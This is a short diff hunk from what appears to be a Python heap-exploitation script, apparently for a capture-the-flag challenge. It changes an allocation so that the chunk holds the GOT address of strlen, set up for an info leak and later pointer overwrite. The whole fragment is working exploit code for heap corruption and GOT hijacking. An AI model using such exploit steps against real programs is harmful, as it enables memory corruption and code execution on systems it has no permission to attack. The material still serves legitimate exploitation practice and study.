@@ -54,7 +54,8 @@ def main():
 
     #malloc the chunk just freed
     add(0x20,'DDDD','d'*0x18)
-    add(0x10,'EEEE','eeee')
+    #add(0x10,'EEEE','eeee')
+    add(0x10,'EEEE',p64(strlen_got)+'d'*0x10)
     edit(3, p64(strlen_got))
     #info leak
     list(2)
